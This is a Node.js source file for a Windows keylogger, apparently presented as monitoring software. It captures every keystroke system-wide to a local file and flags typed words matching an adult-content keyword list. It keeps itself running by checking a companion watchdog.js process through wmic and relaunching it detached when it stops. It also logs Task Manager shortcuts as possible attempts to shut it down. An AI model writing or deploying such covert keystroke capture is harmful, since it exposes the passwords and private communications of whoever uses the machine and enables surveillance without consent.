const fs = require('fs');
const { GlobalKeyboardListener } = require('node-global-key-listener');
const { exec } = require('child_process');
const path = require('path');

// Path to the keywords file
const keywordsFilePath = path.join(__dirname, 'keywords.txt');
// Path to the keylog file
const keylogFilePath = path.join(__dirname, 'keylog.txt');

// Load keywords from file into an array
function loadKeywords() {
    const content = fs.readFileSync(keywordsFilePath, 'utf-8');
    return content.split(/\r?\n/).filter(Boolean);  // Split by line, remove empty lines
}
  
let keywords = loadKeywords();  // Load keywords initially

// Function to scan buffer for adult keywords
function scanForAdultKeywords(bufferContent) {
    const lowerCaseBuffer = bufferContent.toLowerCase();  // Convert the buffer content to lowercase
    for (const keyword of keywords) {
        if (lowerCaseBuffer.includes(keyword.toLowerCase())) {  // Compare with lowercased keywords
            logToKeylogFile(`[WARNING] Adult content detected: "${keyword}"`);
            break;
        }
    }
}

function cleanBuffer(bufferContent) {
    // Replace all punctuation (except spaces) with a space
    const cleanedBuffer = bufferContent.replace(/[.,\/#!$%\^&\*;:{}=\-_`~()]/g, ' ');
    
    // Replace multiple spaces with a single space and trim leading/trailing spaces
    return cleanedBuffer.replace(/\s+/g, ' ').trim();
}

// Log messages to keylog.txt
function logToKeylogFile(message) {
    const timestamp = new Date().toLocaleString();
    const logMessage = `\n${timestamp} - ${message}\n`;
    fs.appendFileSync(keylogFilePath, logMessage);
}

let wasRunning = false; // Tracks if the watchdog was running in the last check

// Function to check if the watchdog process is running
function checkWatchdogStatus() {
    // Check if stop.txt exists
    if (fs.existsSync('stop.txt')) {
      console.log('Stop file detected. Watchdog is shutting down.');
      logToKeylogFile('Watchdog has stopped due to stop.txt.');
      process.exit(0);
    }
  
    // Check the current processes to see if the watchdog is running
    exec('wmic process where "name=\'node.exe\'" get ProcessId, ExecutablePath, CommandLine /FORMAT:LIST', (error, stdout) => {
      if (error) {
        logToKeylogFile(`Error checking watchdog status: ${error.message}`);
        return;
      }
  
      // Check if the output contains the watchdog.js process
      const isWatchdogRunning = stdout.includes('watchdog.js');
  
      if (isWatchdogRunning) {
        wasRunning = true; // Update the status to running
      } else if (wasRunning) {
        // Only log if the watchdog was previously running and has now stopped
        logToKeylogFile('Watchdog has stopped unexpectedly.');
        wasRunning = false; // Update the status to stopped
        startWatchdog();
      }
    });
  }


  // Function to start the keylogger process
function startWatchdog() {
    logToKeylogFile('Starting watchdog...');
      const watchdogPath = path.join(__dirname, 'watchdog.js');
  
      // Command to start the watchdog script
      const watchdogCommand = `start "" /b node "${watchdogPath}"`;
  
      // Use 'exec' to start the watchdog
      const watchdogProcess = exec(watchdogCommand);
  
      // Handle potential error events when attempting to start the watchdog
      watchdogProcess.on('error', (error) => {
        logToKeylogFile(`Failed to start watchdog process: ${error.message}`);
      });
  
      // Handle the 'spawn' event indicating successful startup of the watchdog
      watchdogProcess.on('spawn', () => {
        logToKeylogFile('Watchdog started');
      });
  
      // Optionally, detach the processes if needed
      watchdogProcess.unref();
  }

  
  // Check the status every 1 second
  setInterval(checkWatchdogStatus, 1000);
  
  // Initial check
  checkWatchdogStatus();

// Create a write stream for the key log file
const logStream = fs.createWriteStream(keylogFilePath, { flags: 'a' });

// Function to get the current date
function getCurrentDate() {
    const now = new Date();
    return `${now.toLocaleDateString()}`;
}

// Initialize a buffer for raw characters
let buffer = '';

// Function to write buffer to file
function writeBufferToFile() {
    if (buffer.length > 0) {
        const cleanedBuffer = cleanBuffer(buffer);  // Clean up the buffer by removing punctuation and extra spaces
        scanForAdultKeywords(cleanedBuffer);  // Scan for keywords before writing
        logStream.write(cleanedBuffer);
        buffer = '';
    }
}


// Function to check if the log file needs a newline before writing the date
function ensureNewlineBeforeDate() {
    try {
        // Read the last part of the file to see if it ends with a newline
        const fileContent = fs.readFileSync('keylog.txt', { encoding: 'utf-8' });
        const lastChar = fileContent.slice(-1);
        
        // Check if the last character is not a newline
        if (fileContent.length > 0 && lastChar !== '\n') {
            logStream.write('\n'); // Add a newline if it's missing
        }
    } catch (error) {
        // If the file doesn't exist or there's an error, handle it gracefully
        console.error(`Error checking file for newline: ${error.message}`);
    }
}

// Set up the global key listener
const keyboard = new GlobalKeyboardListener();

// List of keys to log
const keysToLog = new Set([
    'SPACE', 'ENTER', 'BACKSPACE', 'DOT', 'QUOTE', 'MINUS', 'EQUALS', 'COMMA', 'DIVIDE', 'MULTIPLY'
]);

// Map of special keys to human-readable strings
const specialKeysMap = {
    'SPACE': ' ',
    'ENTER': '\n',
    'RETURN': '\n',
    'BACKSPACE': '[BACKSPACE]',
    'BACKSLASH': '\\',
    'FORWARD SLASH': '/',
    'DOT': '.',
    'SEMICOLON': ';',
    'QUOTE': '\'',
    'MINUS': '-',
    'EQUALS': '=',
    'COMMA': ',',
    'DIVIDE': '/',
    'MULTIPLY': '*',
    'NUMPAD0': '0',
    'NUMPAD1': '1',
    'NUMPAD2': '2',
    'NUMPAD3': '3',
    'NUMPAD4': '4',
    'NUMPAD5': '5',
    'NUMPAD6': '6',
    'NUMPAD7': '7',
    'NUMPAD8': '8',
    'NUMPAD9': '9',
    'UP': ' ↑ ',
    'DOWN': ' ↓ ',
    'LEFT': ' ← ',
    'RIGHT': ' → ',
    'LEFT ARROW': ' ← ',
    'RIGHT ARROW': ' → ',
    'DOWN ARROW': ' ↓ ',
    'UP ARROW': ' ↑ '
};

// Map of keys when Shift is pressed
const shiftKeysMap = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
    'MINUS': '_',
    'EQUALS': '+',
    'COMMA': '<',
    'DOT': '>',
    'QUOTE': '\"',
    'SEMICOLON': ':',
    'FORWARD SLASH': '?',
    'BACKSLASH': '|',
    'BRACKETLEFT': '{',
    'BRACKETRIGHT': '}'
};

// Variable to keep track of whether the Shift key is pressed
let isShiftPressed = false;

// List of keys to ignore
const ignoreKeys = new Set([
    'LEFT ALT', 'RIGHT ALT', 'TAB', 'INSERT', 'DELETE', 'HOME', 'END', 'PAGE UP', 'PAGE DOWN', 'PAUSE', 'SCROLL LOCK', 'PRINT SCREEN', 'LEFT META', 'RIGHT META',
    'MOUSE LEFT', 'LEFT CTRL', 'RIGHT CTRL', 'LEFT SHIFT', 'RIGHT SHIFT', 'ESCAPE', 'MOUSE RIGHT'
]);

let lastLoggedDate = getCurrentDate();

// Ensure proper formatting before writing the first date
ensureNewlineBeforeDate();
logStream.write(`${lastLoggedDate}\n`);

keyboard.addListener((event) => {
    // Define Task Manager shortcut conditions
    const isTaskManagerShortcut = 
        (event.name === 'ESC' && event.state === 'DOWN' && event.ctrlKey && event.shiftKey) || // Ctrl + Shift + Esc
        (event.name === 'DELETE' && event.state === 'DOWN' && event.ctrlKey && event.altKey);  // Ctrl + Alt + Delete

    // Handle Task Manager shortcut detection
    if (isTaskManagerShortcut) {
        // Write buffer to file
        writeBufferToFile();

        // Log the Task Manager opening message
        logStream.write('\n[Task Manager has been opened - Potential for closing the monitoring software]\n\n');

        console.log('Task Manager shortcut detected. Logging warning message.');
    }
    
    if (event.state === 'DOWN' && !ignoreKeys.has(event.name)) {
        if (keysToLog.has(event.name)) {
            if (event.name === 'BACKSPACE') {
                buffer = buffer.slice(0, -1); // Remove the last character from the buffer
            } else {
                buffer += specialKeysMap[event.name]; // Add special key representation
            }
        } else if (isShiftPressed && shiftKeysMap[event.name]) {
            buffer += shiftKeysMap[event.name]; // Add Shift-modified character
        } else if (specialKeysMap[event.name]) {
            buffer += specialKeysMap[event.name]; // Add mapped special key character
        } else if (event.rawcode >= 65 && event.rawcode <= 90) { // A-Z
            buffer += isShiftPressed ? event.name : event.name.toLowerCase(); // Add uppercase or lowercase letter
        } else if (event.rawcode >= 48 && event.rawcode <= 57) { // 0-9
            buffer += event.name; // Add number
        } else {
            buffer += isShiftPressed ? event.name : event.name.toLowerCase(); // Add any other character
        }
    } else if (event.name === 'LEFT SHIFT' || event.name === 'RIGHT SHIFT') {
        isShiftPressed = event.state === 'DOWN';
    }
});

// Periodically write buffer to file every 5 seconds and add date if it has changed
setInterval(() => {
    // Check if stop.txt exists
    if (fs.existsSync('stop.txt')) {
        console.log('Stop file detected. Keylogger is shutting down.');
        writeBufferToFile();
        process.exit();
    }

    const currentDate = getCurrentDate();
    if (currentDate !== lastLoggedDate) {
        ensureNewlineBeforeDate();
        logStream.write(`\n${currentDate}\n`);
        lastLoggedDate = currentDate;
    }
    writeBufferToFile();
}, 5000);

// Handle graceful shutdown on Ctrl+C
process.on('SIGINT', () => {
    writeBufferToFile(); // Write any remaining buffer content to the file
    process.exit(); // Exit the process
});
